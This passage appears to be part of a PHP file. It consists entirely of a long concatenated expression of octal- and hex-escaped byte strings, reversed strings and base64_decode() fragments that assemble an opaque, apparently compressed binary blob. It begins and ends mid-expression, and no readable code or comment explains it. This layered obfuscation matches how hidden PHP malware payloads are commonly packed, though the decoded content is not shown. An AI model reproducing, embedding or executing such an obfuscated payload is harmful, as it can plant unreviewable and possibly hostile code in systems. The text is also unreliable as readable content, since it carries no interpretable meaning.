0\66\51\146\43\125\102\244\31\131\347\275\114\347\30\44\154\326\52\3\242\360\250\200\226\222\113\234\335\133\362\10\63\303\60\47\331\61\207\20\264\26\212\243\336\251\42\75\154\367"."\127\51\52\116\72\325\350\5\275\131\51\214\132\32\321\52\106\341\31\3\15\153\210\342\351\35\5\24\27\44\40\50\320\363\63\52\367\307\154\347\17\40\52\14\141\314\162\124\201\353\347\141\74\21\110\74\131"."\60\64\272\13\316\236\156\310\361\304\345\211\57\135\220\313\342\260\200\124\260\63\107\13\23\257\264\42\332\331\270\15\152\213\362\217\132\30\122\331\262\105\244\26\42\244\326\221\351\220\4\333\111\227\216\131\236"."\13\310\45\344\22\310\121\47\254\173\174\136\257\61\46\15\123\311\21\26\271\316\326\73\46\330\367\304\145\335\245\203\32\361\212\362\265\202\110\45\105\6\30\266\143\340\342\173\65\52\44\303\211\341\113\252\46"."\x84\x40\x36\xa7\xd1\xd3\x2c\x8e\x28\xf0\x7f\x6\x13\xa\x44\x5d\xe2\x2a\x1b\x83\xac\x3a\x4a\x72\x39\x66\x59\x30\x2b\xb1\x78\x57\x2d\x62\xc6\x2e\xbe\x28\x89\x4b\x9a\x78\xdd\x4\xd1\x78\xcb\xe1\xf5\x15\xe\x9\x17\xb5\x39\x76\x9f"."\x85\x80\x2e\xc3\xd4\xa\x3c\x45\x88\xe2\x64\x21\x89\x17\x2a\x60\xb1\xce\x47\x35\x4\x4b\x43\x12\x9\xe\xbc\xb\x11\x2e\xc9\x8b\x44\x6b\x4c\xdc\xae\x2c\xc0\x70\x89\x3c\xca\xa3\xeb\x94\x48\x70\xf3\xe0\xd1\xe\x0\x8a\x20\x38\x8f".strrev('™Š®x,Ê|{6òÍ“İV!(¬âwB•ÇŠ£—MÜô&NK—+Âì?üJû…Æ«±hôÃ')."\104\310\224\331\272\220\164\114\117\276\53\301\230\260\327\145\243\41\76\343\370\5\246\135\26\266\62\237\357\222\323\312\146\0\37\320\312\161\310\37\63\152\136\61\330\222\245\33\225\370\314\167\11\76\26\161\330".base64_decode('KuGIog1ZJ3lzxW6F5D8VLcA04bQJbK4AQFxg2JEK5zvCGorWo5hpkQdCqAxhPliGGMw/3KIuXcv5')."\x3\x60\x7e\x55\x26\x3a\x3b\x9e\x42\xf\x95\x10\x53\x9b\x60\x7b\x35\x31\x13\x20\x12\xb8\xa\x4d\x55\x26\x4d\x66\x45\xf1\x25\x6b\xfb\x3f\x7e\xff\xfc\xa9\xcf\x6f\x7b\xe1\x69\x1c\xbd\xe2\xda\x1d\x7f\xfc\xe4\x77\x6f\x5d\x42\x3a\x25".base64_decode('P5acVMiFBrneB//uuXY3HOY6Sacum9ReeeyH3d/7aM2C253VI5tff/W+vuGJu362+S/Hrjn2gR8d')."\334\251\337\175\335\105\157\26\46\63\343\3\337\44\66\367\135\336\36\272\156\343\367\236\367\235\365\102\346\304\103\62\211\275\63\347\136\275\357\347\271\233\146\274\166\315\303\127\314\357\324\177\174\375\211\347\155"."\373\355\75\257\356\134\363\376\127\135\23\377\132\341\175\70\360\300\247\157\356\35\170\340\52\271\375\304\364\337\336\35\75\351\313\311\271\27\377\151\311\266\354\251\376\307\16\71\356\334\271\277\173\356\300\57\74".base64_decode('XQ8171x1Z+pPxyjOmwc+3Npy/n9OPPTAs56+7fHHnijuveHhB4bnHHnZjVr9o1+/tsSx4Ogvl/gu').base64_decode('mvWztk+SrWbkmJdnJaumH3XOZ7mabSMjqw76Vf/4wzP/svsDwVkbDj7hNHlxy6bu0PBPv/nz1W/I')."\227\355\261\154\131\106\376\345\7\235\247\176\137\276\171\307\206\123\337\35\272\341\314\363\167\73\142\115\342\310\243\274\35\33\116\126\147\377\276\56\363\311\71\227\76\174\336\332\246\114\343\103\27\275\235\231\270"."\162\154\377\361\45\257\314\371\327\65\107\135\271\144\155\341\372\237\75\176\307\372\335\266\236\173\352\257\207\316\271\356\231\332\277\265\334\234\153\373\362\355\213\276\374\172\257\313\167\155\17\277\270\164\272\57\64"."\x36\xef\xe2\xc4\x2f\xee\xa9\x7f\x61\x6c\xcf\xb\x6b\xb7\x45\x77\xed\x38\xab\xf8\xdc\xae\xdb\xbe\x7f\xef\xfe\x9f\xd4\x1f\x79\xe2\xe8\x3f\x77\x76\xdf\xb7\xe6\x89\x7\xc6\x9b\xff\xfe\xde\x8a\xee\xfe\x33\x43\xf\xb4\xde\xbe\x75\xcc"."\367\170\150\103\260\272\341\214\370\371\276\303\153\56\375\305\255\125\313\256\335\330\174\323\366\215\77\232\334\345\250\346\313\134\317\217\154\130\321\61\155\161\366\7\325\53\66\135\167\165\274\177\140\325\213\277\257"."\277\160\355\355\221\352\36\351\222\227\67\271\336\236\165\143\360\351\337\157\332\147\361\45\341\203\377\324\360\310\372\302\377\375\352\266\206\333\373\176\123\175\341\17\376\60\170\307\31\37\37\262\141\342\310\323\156".strrev('€òQùoÃïÙ­»³ç|şë’î}ÏÛÑ…ìp¼6g_?½›SÏsâUıß/æ~¸÷×?MıqóKa]s:').base64_decode('s7dcfuPgozedMm3y9D/seuree5h3/3v37PjFN3Uuje9y24OXN3vn9Z99xF9/Fh2re+GdvZbOLp44')."\x6f\xeb\xa7\x1f\x5d\xd9\x7d\xf4\xaf\x7f\x7f\xb8\xeb\x83\xaf\xe\xdf\xb9\xd9\x93\x79\xe8\xa0\x23\x16\x1d\xfd\xc5\x5f\xfa\xa6\xfd\x76\xde\x2b\xcd\xd7\x1e\x68\xfc\xf9\xb0\xf1\xd3\x9f\x88\xb8\xae\x99\xdf\xbf\xdb\xeb\xc7\x8c\x76\xd"."\365\355\377\317\127\316\312\336\175\304\137\127\375\330\127\127\74\362\213\307\346\65\374\372\317\277\337\266\374\272\227\156\150\154\250\373\115\276\67\374\304\217\17\74\350\221\275\366\376\311\143\303\203\157\136\167\142"."\113\113\325\336\167\247\376\334\334\164\215\161\306\372\31\115\53\317\274\147\353\211\267\217\216\374\350\265\167\376\361\322\17\366\137\163\326\262\37\35\40\235\76\262\351\210\31\315\362\242\17\77\336\345\346\357\155"."\75\366\235\163\247\277\350\374\371\157\267\6\37\335\253\341\360\326\363\157\71\373\0\357\76\27\315\53\366\246\77\170\326\234\334\325\60\215\375\356\134\260\117\157\272\345\224\273\377\131\275\71\364\354\252\327\166".strrev('ª_Îø}ßæ¯=jè^zïôúûSøø>ìïâÖğ0i¤nÿ‡áì”ıZÎí½ïNçÔ5l®Cùâù')."\x57\xb6\x9e\xfc\xef\xf8\xe6\xe6\x2b\xf\xdc\xff\x98\x8b\xd4\x4b\x6f\x3b\x71\xee\x9\xde\x66\xf7\x92\x77\xe6\x9e\xf5\x76\x7d\x6e\xa3\xbe\x65\xaf\x8f\xd5\xfb\xe6\x65\x5f\xdc\xb6\x32\xb7\xf9\x32\x33\x7d\x80\x7e\xea\x93\xfd\xb7\xef"."\170\156\350\322\77\326\74\337\364\346\33\41\317\143\147\327\336\261\176\145\337\340\135\77\276\342\272\55\217\34\270\361\372\67\357\173\142\376\253\7\172\245\123\242\236\263\217\171\156\257\305\17\317\76\362\367\155"."\xfb\xdd\x3e\x96\xbd\x42\xdd\xda\xb1\xeb\xc\x7f\x77\xcb\xfa\xa6\x13\xe5\x5\x4b\xfb\x3f\x79\xa3\xa7\xfb\x6f\xf7\x74\xdd\xb0\x3e\xbc\xdb\xc2\xab\xf\x5a\xb8\xcb\x33\x7d\xed\x7f\x68\x9\xde\x3b\xf6\x6c\xdb\x5\xa3\x57\xf4\x7f\x7a"."\xe5\x2b\xff\x6a\x78\xe9\xfe\xed\x5b\x5a\xde\x2a\x75\xdf\x3c\xeb\xc5\x8e\xe8\x4b\x3d\x2f\xd4\xe7\xce\x9f\xfd\xc5\x8d\xd7\xc\xfe\xf0\xfa\xe8\x63\x37\x1d\xe2\xbe\xfa\xb1\x8e\xc7\x3f\x7a\xf0\x7a\xd9\x7d\xe3\x9\x33\xee\x68\x9f\x3e"."\132\65\320\335\162\126\325\117\16\332\147\364\356\47\153\106\377\372\371\321\215\323\367\153\172\136\155\33\172\376\274\353\72\356\157\333\371\366\226\144\123\115\160\172\303\216\25\57\315\33\153\250\35\73\364\202\323".base64_decode('DvMc887XZ59z7bLH97z7il/v4977xezzj7wz/4bMTXv33J+/9oixX7/36Nw797p9LHLZrZdsGTvh')."\x93\x9d\x55\x1d\x77\x7e\xf3\xe3\x25\xaf\x87\xbe\x78\x6c\xf3\x87\x7f\xf\xaf\xff\xe7\x33\x67\xbe\xde\x75\xde\x15\xef\x6e\x79\x7a\xf2\xc9\xa6\x8f\xb\xef\x36\x3c\xb7\xf2\x82\x8f\x4f\xba\x66\x69\xf0\xd4\xa3\x6a\x1a\x9e\x96\x1a\x17"."\236\31\151\31\333\175\315\117\166\276\172\322\33\235\347\37\272\357\213\353\177\275\341\344\357\337\167\160\360\27\317\274\371\310\323\365\47\357\167\304\373\343\107\174\60\146\324\115\177\372\261\207\233\77\131\360\357".base64_decode('Uve1V7Zktlx68vZdmurOfePfr/697cizM1c+8fHf//Z/8p27/+Pgl7Qf/KFwwLMzH3txqOfBNY1X').base64_decode('hZ0HnfS3I87R3h/duOGKw87fltywatdv7hpYu2Lrhdnbf7/8h3ef94Mn7nrrykW3PFi65qwXvnzy')."\xc7\x5b\xf2\x7d\x9d\xbb\xde\x7b\xfe\xb3\x1b\xba\x27\xee\x7a\xe1\x83\x8f\xae\x59\xeb\x79\xb0\x78\xd9\xfa\xf7\x5f\x8d\xdc\xb5\x76\x53\x30\x1a\x7b\xf9\xee\xbb\x4a\xdf\x6b\x4e\x64\x9e\xbe\xee\x96\x93\x9a\x2e\xd8\xfa\x8b\xe2\x26\x4f".base64_decode('oO+6s097o+6SB37r+LJwxrKJnTenDz3+y8+23vzgyvt/uvqzHb96reX4sY8///i+wVsfbDn+s3M+')."\74\140\145\164\355\347\27\77\165\361\255\256\343\277\71\353\302\342\201\257\164\277\373\352\247\307\337\62\61\324\176\342\265\73\357\50\75\52\7\76\73\345\214\346\237\55\252\111\166\234\361\304\202\5\127\177\126"."\xa7\x76\xfd\xfb\xc4\xe7\x1e\x9b\x76\xdc\x1d\xcb\x6e\x9e\xfe\xd4\x67\xe6\xc2\xe3\x66\xac\xd8\x73\xcb\xc2\x87\x6a\xee\x58\x70\xeb\x3f\xbc\xb3\xe3\x87\xed\xe2\x39\xe0\x98\xdd\x4f\xbe\xd7\xf3\xf3\x43\xd2\x99\x5f\xc\xdc\xb4\xcf\x71"."\251\265\271\377\114\377\336\215\347\157\74\144\223\323\235\175\144\154\350\317\127\334\161\360\311\23\333\17\357\37\133\372\313\365\147\325\354\363\227\277\356\175\376\55\327\235\373\331\316\267\116\37\357\72\256\53\361"."\111\107\254\352\260\25\257\15\367\135\325\366\267\265\351\334\33\73\37\173\257\170\311\207\211\326\330\23\255\53\137\136\366\332\153\243\373\37\61\60\274\150\141\337\125\333\136\176\40\173\365\57\57\156\252\53\115"."\x9e\xed\xdb\xf8\xcc\x2d\xf3\xbe\x7c\xf7\x58\xa7\x12\xad\x92\x3e\xd8\xc3\x9d\xd9\xa7\xe3\xff\xba\xdb\x4f\xbf\xfd\xb0\x17\x6f\x3c\xe1\xc0\xa7\x6e\x75\x7f\xb5\xd7\x79\x63\x35\x7\x2d\xec\x98\xfb\xaf\x17\x7f\xf9\xb7\x13\xba\xf\xbb"."\314\277\260\364\144\137\343\264\375\373\337\322\247\377\362\241\272\305\77\331\170\314\243\353\217\271\47\341\367\65\156\236\165\374\242\135\366\275\377\321\342\276\355\247\54\232\366\370\351\311\307\377\372\327\245\231\227"."\246\357\160\234\125\275\300\371\344\306\276\331\227\224\156\170\155\313\33\17\337\171\320\127\357\177\263\161\354\260\256\117\157\371\344\243\351\127\135\360\177\167\167\54\17\35\272\377\232\325\153\137\177\346\316\277\334"."\x76\x70\x6d\xe3\xd6\xfb\x62\xa3\x6d\xd9\x9a\x35\x5b\xfb\x5a\xda\xef\x9b\xbf\xdf\x17\x1f\x7f\xdd\xf2\xe0\xdf\xff\xbe\x68\xce\xa1\x59\x65\xc5\xe1\xc5\x7b\x3f\xfe\xe9\x92\xf\x56\xbc\x70\xde\xf4\x57\xee\xbb\xea\xef\x9b\x7f\x75\xe7"."\147\346\155\317\35\371\144\376\316\255\267\375\173\373\346\231\13\327\334\367\350\25\47\376\144\277\317\337\275\162\341\274\236\273\176\276\344\302\151\247\175\35\272\347\236\333\37\130\232\333\274\207\243\376\216\155\33"."\x8b\xaf\x4f\x4a\x37\x9b\x8f\x74\x66\xf7\xd8\x75\x8f\xb3\xb6\xcc\x3b\xf9\xfc\xee\xd5\xc3\x47\xce\xf9\xbc\x67\xef\x77\x2f\x3d\xe4\xec\xd3\x6b\x16\x3d\xb1\xef\xef\x56\xec\x3e\x63\xe7\xe2\x8d\x77\x5e\xf2\xcc\xe9\xcf\x7c\xf5\xd6\x5e".base64_decode('7x0x3VX9wdMv7Nvse+CdS1ztDvOiU8yvrriqftdXDmutueY3z9V/XNtefDd84NbR9cvWn+e59nen')."\x3d\x72\xfb\x21\xde\x17\xf7\x54\x2f\x39\xee\xe5\xdf\xee\xfe\xa6\x67\xd6\x1d\x4d\x6f\xbe\x70\x50\xf5\x15\xb2\x91\x6f\xbe\xeb\xdc\xc1\xaa\xf5\xd\x8f\x4f\x7c\xe4\xaa\xfe\xc1\xac\x97\x6e\x7b\x69\xdb\x7b\x27\x1c\xf4\xf0\x96\xfb\xd6".strrev('ây&¸?¤ñ¹èmvUÃsş+áj>z­Øî‡ó_I\\¼¬k¶Ï'."\r".'G´Ùø<ÇÙøòİÎ')."\xa3\xfd\x86\x5f\x15\xbd\x4b\x8e\xfe\xcf\x99\x87\x9e\x74\x64\x77\x83\x7b\xc3\x8d\x1f\x3c\xfd\xd2\x6f\x96\x2e\x3d\x73\xff\xbb\xde\xdc\xe3\xd2\xcd\x2f\x5e\xd9\xfa\xd7\xf3\xfe\xf8\xb9\xe7\x63\xf9\xb0\x4f\x9e\xd8\xb9\xf3\x93\xff\x9c".base64_decode('+OYhx73qOOr997auDo8unaXf+fKl995x+7M1s3/5yVN/W5fuvuqqXZ+9aONTh5Y+PeLXI8q6N3Ym')."\xde\xfa\x75\xfd\xb\xc9\x59\x4d\xce\xbe\x2b\x4f\xfb\xeb\xd0\x2d\xab\x9e\xf9\xd4\x79\xde\xeb\x37\x3c\x70\xee\xf0\xe5\x1b\x9f\x8d\x9e\x7b\xf5\xbd\x73\xaf\xbc\xf3\xdd\x43\x4f\xba\xf0\x67\xf2\x39\x5f\x4d\x97\xf7\xb9\xe4\x17\xdb\xde".strrev('7¢ó~¯¨?]÷únÀÕ|Ÿ·*ë}ß—õ¶í¡ºmÜZWŞ×zÜö×¶ûùíÖvÓªõØ')."\333\6\376\374\267\252\175\157\233\165\357\75\23\213\377\63\75\176\371\21\261\266\157\276\170\364\116\267\373\247\137\274\264\365\320\7\133\276\371\367\315\37\176\363\345\366\57\257\75\307\335\276\272\264\363\147\307"."\377\364\303\327\317\377\60\35\363\136\360\372\73\157\177\370\324\361\353\176\374\325\27\237\7\56\276\165\345\312\237\176\360\320\147\267\36\77\376\365\316\237\135\34\373\352\275\167\76\14\174\363\305\373\177\72\354"."\xc9\x5d\xf2\xf2\xde\xfa\x47\xaf\xc6\x4f\xfe\xb4\x7a\xee\x11\xcf\x3e\x1f\x4b\x4e\x68\xf7\x8c\xed\x78\xec\xe5\x3\xd5\xcf\x3f\x39\xb6\xf5\xe0\x57\x7f\x7a\xce\x65\xab\xce\x38\x6d\xe9\xcb\x9b\xe6\x5f\xfa\xeb\x2b\xfe\xfe\xc9\xab\x3f"."\xdd\xf1\x8f\xdb\x5e\xfe\xe7\x1\xa7\x5d\x7b\xed\x1b\x6b\x3e\x3d\xaa\xc5\x7b\xe6\x4d\xf2\xba\xec\x2f\x67\x1f\xfc\x54\xe9\xf4\x45\x1f\x7f\x29\xb5\x5c\xf1\xcc\xa1\xe9\xd0\xbc\x8b\xdd\xd3\x97\x6c\x3b\xb6\xf8\xe1\x1f\xf\x78\x68\xf4".strrev('Êq=ñÎÏœÒ%Á¥Ól>ŞëÉñÿ‡+Êt4zr{œÏ¿¡şr|ÛµÓ3ÿpxÎOæézœu{êñÀ')."\157\274\175\376\363\207\14\354\346\30\377\354\252\345\137\326\274\77\357\314\47\57\154\11\336\277\247\373\347\376\337\324\357\371\365\336\333\137\276\355\352\153\16\241\332\323\211\21\55\227\31\43\227\32\104\215\242"."\261\161\41\16\64\325\21\331\261\141\36\321\152\120\323\205\221\274\101\316\14\344\61\245\244\347\311\366\202\250\33\50\223\305\361\321\34\271\220\42\231\346\65\220\142\26\220\13\245\61\35\174\125\131\115\244\364"."\311\164\52\243\20\221\275\261\241\201\156\203\222\172\146\214\310\272\365\215\115\244\102\344\53\115\363\111\111\251\104\306\34\243\242\375\334\246\171\44\120\67\37\7\346\317\43\31\123\23\111\335\54\222\57\22\330".base64_decode('wibyrdGRiUJGIX0wquXicpo0QBkzM5Mj5AJuwTyCrxczqVyCbuLH8onUaiK7Z/OrR0bHyGVNw0LS').base64_decode('jY315PAlrq4e10dIh82dT6AL55HuaaK9nIyXMqlRcpypj5nF9CTZsuZHtDF5nJxwzasj3TGPdoeR').base64_decode('Mif0DBmeVCk5MVKgF2jaZGYsPkK6ZS4bGdKklJLRc+MjtGNIhWQzVyxpVId+fCSVlFfTOpNOnEjl')."\343\331\64\331\66\65\314\45\375\136\337\104\232\76\157\56\301\133\235\65\322\262\111\372\70\137\322\46\163\105\122\156\46\251\27\163\11\215\242\231\372\150\216\34\101\317\245\35\70\277\216\164\125\141\304\320\342"."\45\172\103\237\32\37\123\264\14\305\255\247\235\115\332\226\230\310\257\146\32\242\115\13\11\151\310\251\264\231\34\41\135\73\167\36\311\44\3\240\306\116\255\306\263\243\223\31\172\167\272\132\317\306\223\204\34"."\x1a\xe8\xc4\x58\x48\x29\x3a\x99\x29\x99\xf1\xd5\x5\xfa\x11\x4a\x76\x94\x10\xe7\x37\x92\x40\xfd\x7c\xd2\xf\xe9\x6c\x7c\xb5\x3c\x42\x14\xd4\x1a\x28\x61\x24\x26\xc6\xd5\xd1\x49\x42\x44\x4d\xb\x68\x31\x34\x59\xd7\xd2\xc6\x78\x9c"."\x8c\xe4\x42\x9a\xdc\x48\xc6\x2e\x37\x1a\x37\x8d\x14\xe9\xda\x5\xd\xa4\xf9\x93\x5a\xc6\x4c\xd2\xbd\xfc\xbc\x5\x4\x9a\x4f\x4d\x4e\xa8\x49\x72\x7b\xdb\x48\x9\x7a\x1e\xed\x33\xb3\x54\x28\xca\x79\x7a\x4d\x90\x1e\x49\x8c\xd1\x93"."\x8b\xfa\xfa\x26\x1a\x60\x3c\xa1\x89\x16\x43\x2a\x94\x55\x27\x72\x49\x7a\x1b\xdc\x40\xa1\x4d\xb\x9\x71\xae\x9e\xcc\x8e\xc4\xe9\xde\x7c\x61\x3\xc9\x9d\x19\x1b\x49\xaf\x4e\x52\xe5\xeb\xac\xae\xe6\x4a\x64\xf8\x53\xf9\x49\xb5\xb0".strrev('…QÇÅD\'¶*'."\r".'†‹6İ°Z#ÒŒNC ´ycDºxâÌ\'³¤õù‹»ÑŒÈ^ºªv2(¥ÍÔblš').strrev('ò‚6²åkÄ©XÕ·gMM…áºÏ'."\n".'’ÌA’ŞDÜE†Œ-=Â§‡9¾tÒãiF¯÷äÕ$¦²')."\x82\x91\x8c\x5b\xd2\x19\x94\x9e\x36\xd8\x53\x52\x76\x78\x1c\x75\x17\xbb\xb2\x87\xff\x91\xc6\x60\x73\x8\x43\x19\x2b\x2a\x4c\xab\x17\x63\xbb\x68\x1f\xc5\x85\xbe\xc6\x27\xce\xa6\x6c\x8c\xba\x44\xb0\x53\x4c\x55\xf3\xe0\xd3\xd9\xac"."\313\152\46\3\155\46\350\320\304\270\52\46\157\41\277\52\24\140\274\137\205\256\260\16\224\240\222\125\110\152\14\232\64\54\346\73\204\316\163\223\60\52\204\155\55\166\361\232\125\303\140\115\245\36\27\152\105".base64_decode('2uqGbXWjAoV2imm4FjzRNoZik9LshJYfF5IK8tqR0/iyjkRDb6VIC1FYaZmc2yEDF4eEP+iQ0MWZ')."\x64\x35\xbe\xf0\x7b\x25\x76\xc3\x28\x8e\xbc\x58\x49\x5d\x29\x64\xe5\x4\xab\x60\x61\x52\x4a\xc9\x20\x6b\xb2\x59\x4a\x81\x9\x20\x51\xd5\x5f\xc9\xd4\x68\x58\xac\x9a\x78\x83\x67\x6b\x8c\x65\x42\xd9\x9b\x63\x49\x4\x3d\x5e\x64\x6"."\xd\xec\x96\xc0\x72\x63\xa5\x75\x66\x65\xc3\x10\x34\x23\xe5\x14\x51\x22\xf7\xe7\x45\x8\x6f\x7b\x2c\xad\x98\x31\xc2\x48\x48\xd9\x1d\x9e\xb0\xbf\x33\x16\xf4\x50\xfd\x46\xb9\x50\x70\x43\xcd\x21\xa8\x80\xc9\x75\x84\x13\x19\x25\x31"."\x1a\x93\xe3\x9a\x6e\x52\xd6\x5b\x84\x6a\xab\xe4\x70\x1f\xdd\xa9\xf2\xee\xc3\x51\x76\x21\x12\x6\x8d\x62\x77\xc1\xba\x92\x54\xa9\xa\x9c\x92\x43\x98\x54\xed\x14\x5d\x78\x30\xdd\xbb\x44\x56\x91\x75\xcb\x65\x4b\x4b\x3b\xa8\xf\x34"."\xa6\x33\x17\xb5\x13\xd3\x1e\x72\x8b\x14\x13\xbe\x4b\xc2\x42\xdd\x5\x68\xd6\x7e\x81\x43\xa7\xb6\xcb\xdb\x21\x58\xbd\x41\x34\x21\x7\x56\xe9\x59\x4\x19\x60\x2b\x87\xb2\x6e\x0\xe1\x50\x31\xf\x53\x89\x22\xb9\x5b\xc8\xef\xe2\xa8"."\xe3\x44\xb9\x2e\x45\x2a\xd6\x67\x6d\x3f\xa8\xb0\x93\x75\x9\x68\x26\x18\xa4\xa4\x81\xd4\x88\xc8\xfc\x3b\x9a\x50\x86\x60\xc9\x13\xe2\xbd\x9\xb3\xa3\xce\xfd\x96\xac\xa6\xd8\xf4\x2\x20\x84\x3c\xd3\xa\x32\xb2\x32\xbd\x10\x32\x0"."\x75\xa8\x79\x85\x8d\x43\xd1\x10\x95\x28\x15\x3e\x9d\xa0\xb6\x5d\x2c\x91\xd5\x28\x67\x4\x23\x18\x4b\xaa\x4\xb5\xd7\xdf\x11\xf3\xfa\x43\x2\xf1\x15\x8a\x76\xe2\x13\x8d\x21\x3d\x41\x7f\x2c\x1c\xe\x8\xa4\xd8\x2c\xf0\x35\xa8\xdc".strrev(''."\n".'¡<G	®5+fj Æ‚ã«W\\âN˜„ñìîq€Ë‰aŠúƒV4*t5Æ0ÑªñuÃ¹+Œa¯Î').base64_decode('hovYoJEMAjFiJBl6AoNSZ6B3oK8/jC31MLw/IKQjzTNLsggmxfqCvZ5On+TvjwSoSinTrEXKxGEW')."\xa7\x4d\xd7\xd\x85\x19\x2a\x92\xfc\x38\x22\x2a\x3c\x8b\x25\xb2\x92\x8\xe5\xe\x39\x66\x47\xab\xa2\xb5\xd1\xea\x68\xcd\x2a\x57\xd4\x18\x26\x13\x6c\x95\x38\x22\x64\xd5\x9\x7a\x49\x8b\x9a\x59\x88\x2d\x55\x7d\xe1\xf0\x71\x44\x9d"."\76\20\362\164\366\322\132\0\156\103\202\201\116\77\16\354\270\340\366\67\357\75\173\307\145\233\266\235\261\36\24\264\375\322\223\266\137\274\345\315\273\327\277\165\362\375\333\66\375\174\307\3\147\157\277\340\326"."\xed\x3f\x3f\x91\x54\xfd\xad\x5b\x7f\xf3\xe6\xfd\xf\xee\xb8\x60\xe3\xb6\x4d\xbf\xdc\x7e\xd1\x3d\x3b\x2e\x3d\x5\x27\xbc\x7d\xe3\xed\xdb\xce\xdc\xc8\x2a\x26\xbd\x7d\xfe\x3\xdb\xcf\xbe\x7e\xfb\x85\xb7\x6d\x5f\xbf\x69\xdb\xbd\xe7".base64_decode('b/vtSdvuvtsBcr996vod92/afvpF2689YftdZ22/fP22Mzdsu2TjjrNv3XbNydtOW//WrRcebacd').strrev('Qc0™¦LZÏŒ[Ù]ŸNş’ËCŠäê—à©Ê†­ø'."\r".'jö1¨Ùî5mF£+İ‹î@£¢')."\32\217\41\375\377\331\123\326\142\55\31\172\241\122\102\145\274\276\160\147\310\337\341\43\352\217\154\240\146\41\65\74\162\15\15\240\341\320\122\26\146\26\21\145\146\271\122\65\65\313\255\221\54\15\221\135\11".base64_decode('LVvM5VFlpSqo71HlgOwWiTlSFVwuAEBJgNlWDa37kGbZ7OWzHXWO+hqJ2OziHMRGV6oi9rksn+Uj')."\216\270\45\126\357\250\253\221\252\12\243\125\244\136\274\137\101\355\143\30\323\220\144\107\65\251\260\130\135\216\13\130\224\141\352\262\12\170\226\224\160\60\20\313\17\176\55\166\267\11\27\317\201\307\11\140\330"."\141\222\247\337\153\305\304\346\272\301\331\222\234\117\202\24\334\277\342\60\317\256\221\342\104\301\264\102\42\312\146\351\214\126\113\147\124\317\41\54\42\330\315\306\33\353\204\112\330\240\0\127\113\66\350\100\21".base64_decode('KBoqCMWjRXE10AwwOBgfBFjKqDLJSwKciCXQEYRwNogV0pAddRUWs3A7c0aacjliyNu3nLWB0jIZ')."\2\205\133\141\103\323\10\137\244\263\7\123\171\130\40\363\144\174\226\205\120\171\167\112\26\22\311\122\203\73\202\207\247\13\144\10\373\42\74\177\177\127\40\324\207\115\2\302\235\75\276\76\217\213\360\157\114"."\x9\x18\x1f\xa\x15\x52\xab\x34\x1b\x72\x3e\xc\x9a\x6d\xe9\x7e\xf4\x21\xda\x65\x11\xf4\x55\x30\xaf\x62\xa6\x62\x98\xb8\x17\xa\x69\x52\x19\x32\xfa\x12\xb2\xf9\x92\x51\x96\xd6\xd9\xd8\xa\x92\x14\xc9\x9c\x6\x4\x42\x91\x18\xe8"."\x0\xc2\x9e\x5\xae\x3b\x5b\x58\x28\x44\xed\xca\xa2\xae\x97\xd8\xb6\x10\xb\xf8\x5c\x6e\x91\xe7\x70\xa1\x47\x49\x12\xe6\x98\x92\x13\x60\x7\x48\x4d\x83\xe3\xd4\x3\x1\xa8\x2\xfc\x72\x67\xa0\xbf\xcb\x4f\x6d\x24\xbc\x71\x4b\x9a"."\67\344\207\366\171\244\162\22\55\41\306\357\305\101\244\60\236\144\141\156\330\6\23\330\262\17\42\174\325\207\51\202\43\4\370\231\160\77\13\163\311\16\104\240\116\33\347\300\203\136\26\356\141\346\115\60\41"."\20\22\42\236\220\247\57\314\242\241\101\300\321\41\114\60\343\351\363\204\43\240\125\375\3\175\234\353\367\172\226\2\202\11\160\271\204\162\354\152\127\155\173\115\24\33\51\340\40\376\131\114\143\120\321\173\170"."\x4d\xbd\x43\x9a\xb7\xae\x86\xe0\x50\xb5\xfe\x98\x99\x1\x72\x77\x8c\x7f\xe5\xb8\xde\x58\x6f\xa0\x1b\xc7\x91\x83\x6\x5f\x3e\xc9\x85\x6f\x69\x48\x2\xc2\x69\x84\xb\xa7\x6\x5d\xbe\xd8\x8c\x90\x0\x1d\x4b\xd8\xf2\x49\xea\xf\xc"."\172\270\265\277\220\200\41\104\374\225\270\17\0\367\312\241\350\170\324\5\104\6\143\25\267\75\360\166\110\124\30\351\204\133\7\242\24\117\162\173\350\212\112\227\16\7\11\304\262\132\232\332\364\2\26\111\5"."\x8\xfc\xbb\x8c\x6\x10\xf7\x24\x19\xc0\xee\xb1\x90\xa5\xb6\x8\xd8\x8\x22\x16\x5d\x1b\x3d\x26\xea\x74\x61\xbb\xf\x28\xc9\x44\x1d\xbc\x66\x31\xdf\x32\xb0\xea\x86\xc3\x16\xa3\x95\x18\xb2\x7e\x27\xa5\x83\x36\x93\x10\x9e\xc7\x38"."\322\102\176\310\306\243\205\364\4\211\266\265\262\241\365\35\267\266\37\374\165\107\326\372\300\137\57\370\351\215\200\301\123\31\2\230\244\275\376\45\276\265\360\37\236\120\43\211\10\376\376\265\340\137\300\142\326".base64_decode('+vvtmTt8kUGfDyPQMPnlqIDlkKYJ7juODVAbJanX1xWRYJx+NharRp3nHJ5TE4u5jQFCLczGs3r2')."\314\372\331\144\25\361\204\73\71\377\265\320\101\71\11\40\15\137\353\370\63\167\24\44\336\35\12\14\4\205\170\217\147\251\277\277\233\306\334\265\64\124\113\255\347\275\376\60\350\242\116\112\203\334\113\206\30"."\47\42\47\22\214\104\221\327\102\320\136\300\333\101\104\20\304\341\16\0\363\146\353\34\353\30\360\367\172\105\273\74\210\110\226\24\304\327\311\252\62\213\126\216\306\221\205\36\215\300\56\247\141\104\136\64\202"."\xfa\x80\x46\x70\x7\xd0\x18\xea\x2e\x1a\x41\xde\x38\x68\x4\x35\x94\x46\xe0\x96\xc4\xd7\x4f\xd3\xc0\x46\x10\x6c\xe2\xe8\xee\x2e\xcd\xf5\x40\x33\x72\x89\xd9\x9b\x2c\x4a\xc6\x5\x53\x52\xc8\x80\x5d\xd8\xed\x2\xb4\x8\x6\xfb\x34"."\231\235\244\331\16\304\320\141\217\17\216\51\131\100\220\242\225\44\230\272\301\223\65\341\174\306\215\61\200\44\212\160\300\157\164\125\73\222\224\127\121\222\305\346\125\146\104\65\263\226\217\22\47\27\340\243\176"."\144\335\42\174\226\254\365\374\100\7\353\136\306\64\101\371\74\214\100\344\220\217\37\226\130\167\116\214\3\255\142\33\42\142\262\352\40\277\72\157\226\125\171\16\102\10\35\354\217\177\242\4\67\112\152\100\254"."\x54\x66\x3b\xe8\x32\x1d\xe3\x6\x8f\xa6\x5e\x14\x34\x35\x91\xce\x18\x18\x10\xf\xb7\x65\x62\x8a\x95\x28\xad\x18\x87\xc8\x62\xc7\xa3\xc3\x29\x30\x18\xd4\xec\x8\xc9\xc\xa4\xea\xa6\x26\x71\x2c\xab\x3e\x28\xb5\x77\x